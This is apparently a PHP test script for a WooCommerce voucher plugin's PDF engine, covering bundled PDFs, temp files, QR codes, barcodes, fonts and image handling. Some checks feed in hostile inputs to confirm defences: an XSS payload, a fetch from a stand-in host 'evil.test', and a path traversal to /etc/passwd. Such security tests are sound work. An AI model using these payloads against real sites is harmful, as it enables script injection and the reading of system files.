$designs['giftcard']['elements'][]      = array( 'id' => 'rot', 'type' => 'text', 'x' => 150, 'y' => 40, 'w' => 60, 'h' => 10, 'text' => 'Rotated {field:dedication}', 'rotation' => -12, 'size' => 10, 'color' => '#b8925a', 'italic' => true );
$designs['giftcard']['page']['backgroundImage'] = 'https://shop.test/wp-content/uploads/2026/11/logo.png';
$designs['giftcard']['page']['backgroundFit']   = 'cover';
$designs['giftcard']['elements'][]      = array( 'id' => 'veil', 'type' => 'rect', 'x' => 68, 'y' => 6, 'w' => 136, 'h' => 136, 'fill' => '#fbf7f0', 'opacity' => 0.9 );
// Put the veil just above the background but below the content.
$veil = array_pop( $designs['giftcard']['elements'] );
array_splice( $designs['giftcard']['elements'], 2, 0, array( $veil ) );

$ticket                 = clone $v;
$ticket->type           = 'ticket';
$ticket->code           = 'TICKET-7Q2M';
$ticket->initial_amount = 0;

foreach ( array( 'giftcard' => $v, 'ticket' => $ticket ) as $key => $voucher ) {
	$start = microtime( true );
	try {
		$pdf = vcap()->pdf->render( $voucher, $designs[ $key ] );
	} catch ( \Throwable $e ) {
		check( "$key renders", false, $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine() );
		continue;
	}
	$file = "$out/$key.pdf";
	file_put_contents( $file, $pdf );
	check( "$key renders a PDF (" . round( strlen( $pdf ) / 1024 ) . ' KB, ' . round( ( microtime( true ) - $start ) * 1000 ) . ' ms)', str_starts_with( $pdf, '%PDF-' ) );
	$size = PdfRenderer::page_size( $designs[ $key ]['page'] );
	$info = (string) shell_exec( 'pdfinfo ' . escapeshellarg( $file ) . ' 2>/dev/null' );
	if ( preg_match( '/Page size:\s+([\d.]+) x ([\d.]+) pts/', $info, $m ) ) {
		check( "$key page size {$size[0]}×{$size[1]} mm", abs( $m[1] - $size[0] * PdfRenderer::MM_TO_PT ) < 1 && abs( $m[2] - $size[1] * PdfRenderer::MM_TO_PT ) < 1, "$m[1] x $m[2] pt" );
		preg_match( '/Pages:\s+(\d+)/', $info, $p );
		check( "$key is a single page", '1' === ( $p[1] ?? '' ), 'pages=' . ( $p[1] ?? '?' ) );
	}
	$text = (string) shell_exec( 'pdftotext ' . escapeshellarg( $file ) . ' - 2>/dev/null' );
	if ( '' !== $text ) {
		check( "$key contains code", str_contains( $text, $voucher->code ) );
		if ( 'giftcard' === $key ) {
			check( 'umlauts survive (Jörg Empfänger, Ümläuten)', str_contains( $text, 'Jörg Empfänger' ) && str_contains( $text, 'Ümläuten' ) );
			check( 'value printed', str_contains( $text, "50,00\u{a0}€" ) || str_contains( $text, '50,00 €' ) );
			$fonts = (string) shell_exec( 'pdffonts ' . escapeshellarg( $file ) . ' 2>/dev/null' );
			if ( '' !== $fonts ) {
				check( 'missing glyphs (✓ in DejaVu Serif Italic) fall back to DejaVu Sans', str_contains( $fonts, 'DejaVuSans-Oblique' ), $fonts );
			}
			check( 'custom field placeholder in markup', str_contains( vcap()->pdf->html( $voucher, $designs[ $key ] ), 'Rotated Für die Beste' ) );
		}
	}
	shell_exec( 'pdftoppm -png -r 110 -singlefile ' . escapeshellarg( $file ) . ' ' . escapeshellarg( "$out/$key" ) . ' 2>/dev/null' );
}
$html = vcap()->pdf->html( $v, array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 50, 'h' => 10, 'text' => '<img src=x onerror=alert(1)> {message}' ) ) ) );
check( 'text is HTML-escaped in PDF markup', ! str_contains( $html, '<img src=x' ) && str_contains( $html, '&lt;img src=x' ) );
check( 'remote images are never fetched', null === vcap()->pdf->image_path( 0, 'https://evil.test/x.png' ) );
check( 'uploads URL maps to local file', $png === vcap()->pdf->image_path( 0, 'https://shop.test/wp-content/uploads/2026/11/logo.png' ) );
check( 'path traversal blocked', null === vcap()->pdf->image_path( 0, 'https://shop.test/wp-content/uploads/../../../../etc/passwd' ) );

echo "Bundled delivery PDF (Z6)\n";
$z6_list = array();
for ( $z6_i = 1; $z6_i <= 3; $z6_i++ ) {
	$z6_v       = clone $v;
	$z6_v->id   = 9100 + $z6_i;
	$z6_v->code = 'BUNDLE-000' . $z6_i;
	$z6_list[]  = $z6_v;
}
$z6_parts = vcap()->pdf->render_many( $z6_list );
check( 'Z6: three vouchers of one design are rendered as one PDF document', 1 === count( $z6_parts ) && 3 === count( $z6_parts[0]['vouchers'] ) && str_starts_with( $z6_parts[0]['pdf'], '%PDF-' ) );
file_put_contents( "$out/z6-bundle.pdf", $z6_parts[0]['pdf'] ?? '' );
$z6_info = (string) shell_exec( 'pdfinfo ' . escapeshellarg( "$out/z6-bundle.pdf" ) . ' 2>/dev/null' );
if ( preg_match( '/Pages:\s+(\d+)/', $z6_info, $z6_m ) ) {
	check( 'Z6: the bundle PDF has exactly one page per voucher (no blank pages)', '3' === $z6_m[1], 'pages=' . $z6_m[1] );
	$z6_text = (string) shell_exec( 'pdftotext ' . escapeshellarg( "$out/z6-bundle.pdf" ) . ' - 2>/dev/null' );
	$z6_page = (string) shell_exec( 'pdftotext -f 2 -l 2 ' . escapeshellarg( "$out/z6-bundle.pdf" ) . ' - 2>/dev/null' );
	check( 'Z6: every code is printed, each on its own page', str_contains( $z6_text, 'BUNDLE-0001' ) && str_contains( $z6_text, 'BUNDLE-0003' ) && str_contains( $z6_page, 'BUNDLE-0002' ) && ! str_contains( $z6_page, 'BUNDLE-0001' ), $z6_page );
}
$z6_files = vcap()->pdf->bundle_to_temp_files( $z6_list );
check( 'Z6: the bundle PDF is written as one private temp file named after the first voucher and the count', is_array( $z6_files ) && 1 === count( $z6_files ) && str_ends_with( $z6_files[0], '-and-2-more.pdf' ) && is_file( $z6_files[0] ), wp_json_encode( $z6_files ) );
foreach ( (array) $z6_files as $z6_file ) {
	@unlink( $z6_file );
}
check( 'Z6: bundled from 5 vouchers, PDF up to 50 by default', 5 === Delivery::bundle_threshold() && 50 === Delivery::bundle_pdf_limit() );
$GLOBALS['vcap_test_options']['vcap_bundle_threshold'] = 1;
$z6_one = Delivery::bundle_threshold();
$GLOBALS['vcap_test_options']['vcap_bundle_threshold'] = 0;
$z6_off = Delivery::bundle_threshold();
unset( $GLOBALS['vcap_test_options']['vcap_bundle_threshold'] );
$GLOBALS['vcap_test_filters']['vcap_bundle_threshold'] = array( array( static fn() => 20, 1 ) );
$GLOBALS['vcap_test_filters']['vcap_bundle_pdf_limit'] = array( array( static fn() => 0, 1 ) );
check( 'Z6: setting 0 switches bundling off, 1 means 2; the filters "vcap_bundle_threshold" and "vcap_bundle_pdf_limit" decide', 2 === $z6_one && 0 === $z6_off && 20 === Delivery::bundle_threshold() && 0 === Delivery::bundle_pdf_limit() );
unset( $GLOBALS['vcap_test_filters']['vcap_bundle_threshold'], $GLOBALS['vcap_test_filters']['vcap_bundle_pdf_limit'] );
$z6_a                  = clone $v;
$z6_a->order_item_id   = 55;
$z6_a->send_to         = 'recipient';
$z6_a->buyer_email     = 'buyer@example.com';
$z6_a->recipient_email = 'Lea@Example.com';
$z6_b                  = clone $z6_a;
$z6_b->recipient_email = 'lea@example.com';
$z6_c                  = clone $z6_a;
$z6_c->recipient_email = 'max@example.com';
$z6_d                  = clone $z6_a;
$z6_d->order_item_id   = 56;
check( 'Z6: vouchers share a bundle only with the same order line and recipient address (case ignored)', Delivery::bundle_key( $z6_a ) === Delivery::bundle_key( $z6_b ) && Delivery::bundle_key( $z6_a ) !== Delivery::bundle_key( $z6_c ) && Delivery::bundle_key( $z6_a ) !== Delivery::bundle_key( $z6_d ) );
$z6_mail = (string) file_get_contents( VCAP_PATH . 'templates/emails/voucher-bundle.php' );
check( 'Z6: the bundled email has its own HTML and plain template with a code table and download links', str_contains( $z6_mail, '$download_urls[ $vcap_v->id ]' ) && str_contains( $z6_mail, "woocommerce_email_header" ) && str_contains( (string) file_get_contents( VCAP_PATH . 'templates/emails/plain/voucher-bundle.php' ), '$download_urls[ $vcap_v->id ]' ) );

echo "PDF temp files, templates and designer (P8)\n";
$p8_design = array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 10, 'text' => '{coupon_code}' ) ) );
// Q14: a parallel delivery with the same file name writes its PDF while this one renders.
$p8_target = VCAP\Install::upload_dir() . '/tmp/' . vcap()->pdf->filename( $v );
@unlink( $p8_target );
$GLOBALS['vcap_test_filters']['vcap_pdf_html'] = array(
	array(
		static function ( $html ) use ( $p8_target ) {
			if ( ! file_exists( $p8_target ) ) {
				file_put_contents( $p8_target, 'OTHER VOUCHER' );
			}
			return $html;
		},
		1,
	),
);
$p8_file = vcap()->pdf->to_temp_file( $v, $p8_design );
unset( $GLOBALS['vcap_test_filters']['vcap_pdf_html'] );
check( 'Q14: a temp PDF never overwrites or shares the file of a parallel delivery with the same name', is_string( $p8_file ) && $p8_file !== $p8_target && 'OTHER VOUCHER' === file_get_contents( $p8_target ) && str_starts_with( (string) file_get_contents( $p8_file ), '%PDF-' ) && str_ends_with( $p8_file, '-' . basename( $p8_target ) ), (string) $p8_file );
@unlink( $p8_target );
@unlink( (string) $p8_file );
$p8_file = vcap()->pdf->to_temp_file( $v, $p8_design );
check( 'M12-43: a temp PDF always has a random 24-character prefix and is attached under the configured name', $p8_file !== $p8_target && (bool) preg_match( '/^[A-Za-z0-9]{24}-' . preg_quote( basename( $p8_target ), '/' ) . '$/', basename( (string) $p8_file ) ) && basename( $p8_target ) === PdfRenderer::attachment_name( (string) $p8_file ), (string) $p8_file );
@unlink( (string) $p8_file );

// Z11: QR codes and barcodes are vector SVG (no GD) and the printed QR modules are those of the payload.
$p8_payload = 'https://shop.test/redeem/?vcap_code=ab12-Cd34';
$p8_qr      = array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'qrcode', 'x' => 10, 'y' => 10, 'w' => 60, 'h' => 60, 'qrContent' => 'custom', 'qrValue' => $p8_payload, 'color' => '#000000' ) ) );
$p8_html    = vcap()->pdf->html( $v, $p8_qr );
check( 'Z11: the QR code is an SVG image, not a GD PNG', str_contains( $p8_html, 'data:image/svg+xml;base64,' ) && ! str_contains( $p8_html, 'image/png' ) );
file_put_contents( "$out/p8-qr.pdf", vcap()->pdf->render( $v, $p8_qr ) );
shell_exec( 'pdftoppm -png -r 300 -singlefile ' . escapeshellarg( "$out/p8-qr.pdf" ) . ' ' . escapeshellarg( "$out/p8-qr" ) . ' 2>/dev/null' );
if ( is_readable( "$out/p8-qr.png" ) ) {
	$p8_ref = new chillerlan\QRCode\QRCode( new chillerlan\QRCode\QROptions( array( 'eccLevel' => chillerlan\QRCode\Common\EccLevel::M, 'addQuietzone' => true, 'quietzoneSize' => 4 ) ) );
	foreach ( chillerlan\QRCode\Common\Mode::INTERFACES as $p8_mode ) {
		if ( $p8_mode::validateString( $p8_payload ) ) {
			$p8_ref->addSegment( new $p8_mode( $p8_payload ) );
			break;
		}
	}
	$p8_grid  = $p8_ref->getQRMatrix()->getMatrix( true );
	$p8_n     = count( $p8_grid );
	$p8_img   = imagecreatefrompng( "$out/p8-qr.png" );
	$p8_px    = 300 / 25.4;
	$p8_wrong = 0;
	foreach ( $p8_grid as $p8_y => $p8_row ) {
		foreach ( $p8_row as $p8_x => $p8_dark ) {
			$p8_rgb   = imagecolorat( $p8_img, (int) round( ( 10 + ( $p8_x + 0.5 ) * 60 / $p8_n ) * $p8_px ), (int) round( ( 10 + ( $p8_y + 0.5 ) * 60 / $p8_n ) * $p8_px ) );
			$p8_lum   = ( ( $p8_rgb >> 16 ) & 255 ) + ( ( $p8_rgb >> 8 ) & 255 ) + ( $p8_rgb & 255 );
			$p8_wrong += ( $p8_lum < 384 ) !== $p8_dark ? 1 : 0;
		}
	}
	check( "Z11: every printed QR module matches the payload's QR matrix ({$p8_n}×{$p8_n})", 0 === $p8_wrong, "$p8_wrong wrong modules" );
}
$p8_bc = static fn( string $type, string $value ) => vcap()->pdf->html( $v, array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'barcode', 'x' => 5, 'y' => 5, 'w' => 60, 'h' => 15, 'barcodeType' => $type, 'qrValue' => $value ) ) ) );
check( 'Z11: barcodes are SVG images, not GD PNGs', str_contains( $p8_bc( 'C128', '{coupon_code}' ), 'data:image/svg+xml;base64,' ) && ! str_contains( $p8_bc( 'C128', '{coupon_code}' ), 'image/png' ) );
check( 'Z11: an EAN-13 barcode of a code that is no EAN (GIFT-ABCD-1234) is printed as Code 128, never left empty', str_contains( $p8_bc( 'EAN13', '{coupon_code}' ), 'data:image/svg+xml;base64,' ) && str_contains( $p8_bc( 'EAN13', '{coupon_code}' ), 'GIFT-ABCD-1234' ) );
check( 'Z11: EAN-13 takes 12 digits or 13 with a valid check digit, Code 39 no lower case', PdfRenderer::barcode_fits( 'EAN13', '400638133393' ) && PdfRenderer::barcode_fits( 'EAN13', '4006381333931' ) && ! PdfRenderer::barcode_fits( 'EAN13', '4006381333932' ) && ! PdfRenderer::barcode_fits( 'EAN13', '1234567890123456' ) && ! PdfRenderer::barcode_fits( 'C39', 'gift-1' ) && PdfRenderer::barcode_fits( 'C39', 'GIFT-1' ) );
$p8_clean = TemplatePostType::sanitize_design( array( 'elements' => array( array( 'type' => 'barcode', 'barcodeType' => 'EAN13', 'qrValue' => 'SHOP-1' ), array( 'type' => 'barcode', 'barcodeType' => 'EAN13', 'qrValue' => '400638133393' ), array( 'type' => 'barcode', 'barcodeType' => 'EAN13', 'qrValue' => '{product_sku}' ) ) ) );
check( 'Z11: saving switches a fixed value that EAN-13 cannot carry to Code 128 and keeps fitting values and placeholders', 'C128' === $p8_clean['elements'][0]['barcodeType'] && 'EAN13' === $p8_clean['elements'][1]['barcodeType'] && 'EAN13' === $p8_clean['elements'][2]['barcodeType'] );

// Z14: a custom font (vcap_pdf_fonts) is measured with the render options, not with a bare dompdf that does not know it.
$p8_font = $GLOBALS['vcap_test_uploads'] . '/fonts-test/TestMono.ttf';
@mkdir( dirname( $p8_font ), 0777, true );
copy( VCAP_PATH . 'vendor/dompdf/dompdf/lib/fonts/DejaVuSansMono.ttf', $p8_font );
$GLOBALS['vcap_test_filters']['vcap_pdf_fonts'] = array( array( static fn( $fonts ) => array( 'Test Mono' => array( 'normal' => $p8_font ) ) + (array) $fonts, 1 ) );
$p8_ratio = PdfRenderer::font_height_ratio( 'Test Mono', false, false );
check( 'Z14: a custom font gets its own line-height ratio (same as the TTF it is, not 1.0)', abs( $p8_ratio - PdfRenderer::font_height_ratio( 'DejaVu Sans Mono', false, false ) ) < 0.001 && abs( $p8_ratio - 1.0 ) > 0.05, (string) $p8_ratio );
file_put_contents( "$out/p8-font.pdf", vcap()->pdf->render( $v, array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 10, 'text' => 'Custom {coupon_code}', 'font' => 'Test Mono' ) ) ) ) );
$p8_fonts = (string) shell_exec( 'pdffonts ' . escapeshellarg( "$out/p8-font.pdf" ) . ' 2>/dev/null' );
if ( '' !== $p8_fonts ) {
	check( 'Z14: the custom font is embedded in the PDF', str_contains( $p8_fonts, 'DejaVuSansMono' ), $p8_fonts );
}
unset( $GLOBALS['vcap_test_filters']['vcap_pdf_fonts'] );
$p8_css = TemplatePostType::designer_font_css();
check( 'Z14: the designer loads the DejaVu fonts dompdf prints with as web fonts (all 12 styles)', 12 === substr_count( $p8_css, '@font-face' ) && str_contains( $p8_css, "font-family:'DejaVu Serif';font-weight:normal;font-style:italic;src:url('https://shop.test/wp-content/plugins/voucher-captain/vendor/dompdf/dompdf/lib/fonts/DejaVuSerif-Italic.ttf')" ), $p8_css );
// H16: a long message and a long code are set smaller until they fit, the last words are printed.
$p8_long          = clone $v;
$p8_long->message = trim( str_repeat( 'Liebe Anna, wir wünschen dir alles Gute, viel Freude und einen wunderbaren Tag mit allen, die du gern hast. ', 5 ) ) . "\nHerzlich, deine Familie ENDGRUSS";
$p8_long->code    = 'GIFT-K7QM2X9ZPA-ABCDEFGHJKLMNPQR-2026';
file_put_contents( "$out/p8-long.pdf", vcap()->pdf->render( $p8_long, TemplatePostType::default_designs()['giftcard'] ) );
$p8_text = preg_replace( '/\s+/', ' ', (string) shell_exec( 'pdftotext -raw ' . escapeshellarg( "$out/p8-long.pdf" ) . ' - 2>/dev/null' ) );
if ( '' !== trim( (string) $p8_text ) ) {
	// pdftotext also extracts clipped text: the word's position must lie inside the message box (y 56–86 mm).
	$p8_bbox = (string) shell_exec( 'pdftotext -bbox ' . escapeshellarg( "$out/p8-long.pdf" ) . ' - 2>/dev/null' );
	$p8_end  = preg_match( '/yMax="([\d.]+)">ENDGRUSS</', $p8_bbox, $p8_m ) ? (float) $p8_m[1] : 999.0;
	check( 'H16: the last line of a long message is printed inside its box, not cut off', str_contains( (string) $p8_text, 'deine Familie ENDGRUSS' ) && $p8_end <= 86 * PdfRenderer::MM_TO_PT, 'yMax ' . $p8_end . ' pt' );
	check( 'H16: a long code is printed whole on one line', str_contains( (string) $p8_text, 'GIFT-K7QM2X9ZPA-ABCDEFGHJKLMNPQR-2026' ), (string) $p8_text );
}
$p8_fit = PdfRenderer::fit_size( 'Kurz', 'DejaVu Serif', 11, 1.25, false, true, 0, 120, 30 );
$p8_cut = PdfRenderer::fit_size( str_repeat( 'Wort ', 2000 ), 'DejaVu Serif', 11, 1.25, false, true, 0, 120, 30 );
check( 'H16: a text that fits keeps its size; one that cannot fit stops at half the size and says so', array( 'size' => 11.0, 'fits' => true ) === $p8_fit && 5.5 === $p8_cut['size'] && false === $p8_cut['fits'], json_encode( array( $p8_fit, $p8_cut ) ) );
check( 'H16: the template preview shows a worst-case message as long as products allow by default', 300 === mb_strlen( TemplatePostType::preview_voucher()->message ) );
// M8: characters without a glyph are found before the PDF prints boxes; emoji are left out; RTL text is reported.
$p8_missing = PdfRenderer::unsupported_chars( 'Jörg 张伟 – Alles Gute 🎉 ✓ €' );
check( 'M8: Chinese letters and emoji have no glyph in the PDF fonts, umlauts, ✓ and € do', array( '张', '伟', '🎉' ) === $p8_missing, json_encode( $p8_missing, JSON_UNESCAPED_UNICODE ) );
$p8_emoji          = clone $v;
$p8_emoji->message = "Alles Gute 🎉🎁 und 👍🏽 viel Spaß ❤️\nDein Team ✓";
$p8_html           = vcap()->pdf->html( $p8_emoji, array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'text', 'x' => 5, 'y' => 5, 'w' => 90, 'h' => 30, 'text' => '{message}' ) ) ) );
check( 'M8: emoji without a glyph are left out of the PDF instead of printing empty boxes, the rest of the text stays', str_contains( $p8_html, 'Alles Gute und viel Spaß' ) && str_contains( $p8_html, 'Dein Team ✓' ) && ! preg_match( '/[\x{1F300}-\x{1FAFF}\x{FE0F}\x{200D}]/u', $p8_html ), $p8_html );
check( 'M8: the customer is warned about characters the PDF cannot print and about right-to-left text', str_contains( PdfRenderer::print_warning( 'Message', 'Für 张伟 🎉' ), '张 伟 🎉' ) && str_contains( PdfRenderer::print_warning( 'Message', 'שלום' ), 'right-to-left' ) && '' === PdfRenderer::print_warning( 'Message', 'Jörg Müller ✓' ) );
check( 'M8: the add-to-cart validation shows the print warnings as notices', str_contains( (string) file_get_contents( VCAP_PATH . 'src/Fields.php' ), "foreach ( \$this->print_warnings( \$product ) as \$message ) {\n\t\t\t\twc_add_notice( \$message, 'notice' )" ) );
$GLOBALS['vcap_test_filters']['vcap_pdf_fonts']          = array( array( static fn( $fonts ) => array( 'Test Mono' => array( 'normal' => $p8_font ) ), 1 ) );
$GLOBALS['vcap_test_filters']['vcap_pdf_fallback_fonts'] = array( array( static fn() => array( 'Test Mono', 'Not Registered' ), 1 ) );
check( 'M8: fallback fonts (vcap_pdf_fallback_fonts) follow DejaVu Sans in every font stack, unregistered families are ignored', "'DejaVu Serif', 'DejaVu Sans', 'Test Mono'" === PdfRenderer::font_stack( 'DejaVu Serif' ), PdfRenderer::font_stack( 'DejaVu Serif' ) );
unset( $GLOBALS['vcap_test_filters']['vcap_pdf_fonts'], $GLOBALS['vcap_test_filters']['vcap_pdf_fallback_fonts'] );
check( 'M8: COMPATIBILITY.md documents fallback fonts and the right-to-left limit', str_contains( (string) file_get_contents( VCAP_PATH . 'COMPATIBILITY.md' ), 'vcap_pdf_fallback_fonts' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'COMPATIBILITY.md' ), 'no bidirectional layout' ) );
// Z10: image types dompdf cannot draw (AVIF, HEIC) are left out, refused in the designer and reported.
$p8_avif = $GLOBALS['vcap_test_uploads'] . '/2026/11/photo.avif';
file_put_contents( $p8_avif, "\0\0\0\x1cftypavif\0\0\0\0avifmif1miaf" . str_repeat( "\0", 64 ) );
$GLOBALS['vcap_test_attachments'][79] = $p8_avif;
$p8_img_design = array( 'page' => array( 'format' => 'A6', 'backgroundImageId' => 79 ), 'elements' => array( array( 'id' => 'i1', 'type' => 'image', 'name' => 'Photo', 'imageId' => 79, 'x' => 0, 'y' => 0, 'w' => 50, 'h' => 50 ) ) );
check( 'Z10: an AVIF image is left out of the PDF instead of printing a broken-image frame', null === vcap()->pdf->image_path( 79, '' ) && ! str_contains( vcap()->pdf->html( $v, $p8_img_design ), '<img' ) && $png === vcap()->pdf->image_path( 77, '' ) );
check( 'Z10: only JPEG, PNG, GIF (and WebP with GD support) can be chosen', array_slice( PdfRenderer::image_mimes(), 0, 3 ) === array( 'image/jpeg', 'image/png', 'image/gif' ) && ! in_array( 'image/avif', PdfRenderer::image_mimes(), true ) && str_contains( (string) file_get_contents( VCAP_PATH . 'assets/js/designer.js' ), 'library: { type: mimes }' ) );
$p8_warn = TemplatePostType::design_warnings( $p8_img_design );
// getimagesize() names AVIF as image/avif on PHP 8.1; newer versions refuse the stub file, then the extension is shown.
check( 'Z10: the designer warns about the AVIF background and image', 2 === count( $p8_warn ) && (bool) preg_match( '~Image "Photo" is of type (image/)?avif,~', $p8_warn[1] ), json_encode( $p8_warn ) );
// C7: missing local files are reported; images of allowed hosts (offloaded media / CDN) are downloaded.
$GLOBALS['vcap_test_attachments'][80] = $GLOBALS['vcap_test_uploads'] . '/2026/11/offloaded.png';
$p8_warn = TemplatePostType::design_warnings( array( 'page' => array( 'format' => 'A6' ), 'elements' => array( array( 'type' => 'image', 'name' => 'Logo', 'imageId' => 80, 'src' => 'https://cdn.shop.test/2026/11/offloaded.png' ) ) ) );
check( 'C7: an image without a local file is reported in the designer and Site Health', 1 === count( $p8_warn ) && str_contains( $p8_warn[0], 'Image "Logo" cannot be read' ), json_encode( $p8_warn ) );
$GLOBALS['vcap_test_http_log'] = array();
$GLOBALS['vcap_test_http']     = static fn( $url ) => array( 'code' => 200, 'body' => (string) file_get_contents( $png ), 'headers' => array() );
check( 'C7: without an allowed host nothing is downloaded', null === vcap()->pdf->image_path( 80, 'https://cdn.shop.test/2026/11/offloaded.png' ) && array() === $GLOBALS['vcap_test_http_log'] );
$GLOBALS['vcap_test_filters']['vcap_pdf_remote_hosts'] = array( array( static fn() => array( 'cdn.shop.test' ), 1 ) );
$p8_remote = vcap()->pdf->image_path( 80, 'https://cdn.shop.test/2026/11/offloaded.png' );
check( 'C7: an offloaded image is downloaded from an allowed host into the private temp folder and printed', is_string( $p8_remote ) && str_starts_with( $p8_remote, VCAP\Install::upload_dir() . '/tmp/' ) && file_get_contents( $p8_remote ) === file_get_contents( $png ) && array( 'https://cdn.shop.test/2026/11/offloaded.png' ) === $GLOBALS['vcap_test_http_log'] );
$GLOBALS['vcap_test_http_log'] = array();
check( 'C7: the download is reused (no second request) and other hosts stay blocked', $p8_remote === vcap()->pdf->image_path( 80, 'https://cdn.shop.test/2026/11/offloaded.png' ) && null === vcap()->pdf->image_path( 0, 'https://evil.test/x.png' ) && array() === $GLOBALS['vcap_test_http_log'] );
$GLOBALS['vcap_test_http'] = static fn( $url ) => array( 'code' => 200, 'body' => '<html>not an image</html>', 'headers' => array() );
check( 'C7: a download that is no image is not used', null === vcap()->pdf->image_path( 0, 'https://cdn.shop.test/other.png' ) );
unset( $GLOBALS['vcap_test_filters']['vcap_pdf_remote_hosts'], $GLOBALS['vcap_test_http'] );
@unlink( (string) $p8_remote );
check( 'C7: Site Health checks the template images', method_exists( VCAP\Health::class, 'test_template_images' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Health.php' ), "'rate_limits', 'template_images', " ) );
echo "M12 PDF engine, templates and wallet links (F1)\n";
// M12-39: the customer's texts are measured as the PDF sets them; too long → error with the lines the box holds.
$m12_gift          = TemplatePostType::default_designs()['giftcard'];
$m12_fit           = clone $v;
$m12_fit->message  = 'Alles Gute!';
$m12_report        = PdfRenderer::fit_report( $m12_gift, $m12_fit );
$m12_msg_row       = array_values( array_filter( $m12_report, static fn( $r ) => in_array( 'message', $r['tokens'], true ) ) )[0] ?? null;
check( 'M12-39: the fit report covers the elements with {message} and {recipient_name}; a short message keeps its size', null !== $m12_msg_row && true === $m12_msg_row['fits'] && 1.0 === (float) $m12_msg_row['scale'] && in_array( array( 'recipient_name' ), array_map( static fn( $r ) => $r['tokens'], $m12_report ), true ), wp_json_encode( $m12_report ) );
$m12_fit->message  = str_repeat( "Zeile\n", 40 );
$m12_cut           = array_values( array_filter( PdfRenderer::fit_report( $m12_gift, $m12_fit ), static fn( $r ) => in_array( 'message', $r['tokens'], true ) ) )[0] ?? array();
check( 'M12-39: 40 short lines do not fit the message box: reported with the number of lines it holds at half the size', false === ( $m12_cut['fits'] ?? null ) && ( $m12_cut['max_lines'] ?? 0 ) >= 8 && ( $m12_cut['max_lines'] ?? 99 ) <= 20, wp_json_encode( $m12_cut ) );
$m12_fit->message  = str_repeat( "Zeile\n", 8 ) . 'Ende';
$m12_small         = array_values( array_filter( PdfRenderer::fit_report( $m12_gift, $m12_fit ), static fn( $r ) => in_array( 'message', $r['tokens'], true ) ) )[0] ?? array();
check( 'M12-39: nine lines fit only below 75 % of the size (notice)', true === ( $m12_small['fits'] ?? null ) && ( $m12_small['scale'] ?? 1 ) < PdfRenderer::SHRINK_NOTICE, wp_json_encode( $m12_small ) );
$m12_fit->message  = str_repeat( "Zeile\n", 40 );
$m12_banner        = VCAP\Preview::with_fit_banner( $m12_gift, $m12_fit );
$m12_note          = end( $m12_banner['elements'] );
check( 'M12-39: the customer preview shows a red note "Text too long … max. approx. N lines"', 'vcap-fit-note' === ( $m12_note['id'] ?? '' ) && str_contains( (string) $m12_note['text'], 'max. approx.' ) && count( $m12_banner['elements'] ) === count( $m12_gift['elements'] ) + 1 );
$m12_fit->message  = 'Kurz';
check( 'M12-39: no note when every text fits at full size', VCAP\Preview::with_fit_banner( $m12_gift, $m12_fit ) === $m12_gift );
$m12_lines = TemplatePostType::preview_voucher( 'lines' )->message;
check( 'M12-39: the template preview has a worst-case variant with many line breaks', TemplatePostType::PREVIEW_LINES === count( explode( "\n", $m12_lines ) ) && 300 === mb_strlen( TemplatePostType::preview_voucher()->message ) && str_contains( (string) file_get_contents( VCAP_PATH . 'assets/js/designer.js' ), "name: 'variant'" ) );
check( 'M12-39: the product option "Message max. lines" exists (default 0 = no limit) and is validated', 0 === ProductConfig::DEFAULTS['message_maxlines'] && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Fields.php' ), "may contain at most %2\$d lines." ) );

// M12-40: QR codes and barcodes on white with quiet zones, opacity ignored, readability warnings.
$m12_codes = vcap()->pdf->html( $v, array( 'page' => array( 'format' => 'A6', 'background' => '#1f3a4d' ), 'elements' => array( array( 'type' => 'qrcode', 'x' => 10, 'y' => 10, 'w' => 30, 'h' => 30, 'qrContent' => 'code', 'opacity' => 0.3 ), array( 'type' => 'barcode', 'x' => 10, 'y' => 60, 'w' => 80, 'h' => 20, 'opacity' => 0.4 ) ) ) );
preg_match_all( '/<div class="el" style="([^"]*)"><img src="data:image\/svg/', $m12_codes, $m12_code_styles );
check( 'M12-40: the opacity of QR codes and barcodes is ignored, both lie on white', 2 === count( $m12_code_styles[1] ) && ! str_contains( implode( '', $m12_code_styles[1] ), 'opacity' ) && str_contains( $m12_codes, 'background:#ffffff;" /></div>' ) && str_contains( $m12_code_styles[1][1], 'background:#ffffff' ), $m12_codes );
preg_match( '/<img src="data:image\/svg\+xml;base64,[^"]+" style="width:([\d.]+)mm;height:[\d.]+mm;margin-left:([\d.]+)mm;"/', $m12_codes, $m12_bar );
$m12_modules = PdfRenderer::barcode_modules( 'C128', $v->code );
check( 'M12-40: a barcode keeps 10 modules of white left and right', isset( $m12_bar[2] ) && abs( (float) $m12_bar[2] - 80 * 10 / $m12_modules ) < 0.01 && abs( (float) $m12_bar[1] - ( 80 - 2 * (float) $m12_bar[2] ) ) < 0.01, wp_json_encode( array( $m12_bar, $m12_modules ) ) );
$m12_qr_svg = preg_match( '/<img src="data:image\/svg\+xml;base64,([^"]+)" style="width:30mm/', $m12_codes, $m12_q ) ? (string) base64_decode( $m12_q[1] ) : '';
check( 'M12-40: the light QR modules are drawn in white (no dark ground shows through)', str_contains( $m12_qr_svg, '#fff' ), substr( $m12_qr_svg, 0, 300 ) );
$m12_warn = TemplatePostType::design_warnings(
	array(
		'page'     => array( 'format' => 'A6' ),
		'elements' => array(
			array( 'id' => 'q', 'name' => 'Tiny QR', 'type' => 'qrcode', 'x' => 0, 'y' => 0, 'w' => 12, 'h' => 12, 'qrContent' => 'download' ),
			array( 'id' => 'b', 'name' => 'Narrow bars', 'type' => 'barcode', 'x' => 0, 'y' => 0, 'w' => 25, 'h' => 10 ),
			array( 'id' => 'p', 'name' => 'Pale QR', 'type' => 'qrcode', 'x' => 0, 'y' => 0, 'w' => 40, 'h' => 40, 'color' => '#aaaaaa' ),
		),
	)
);
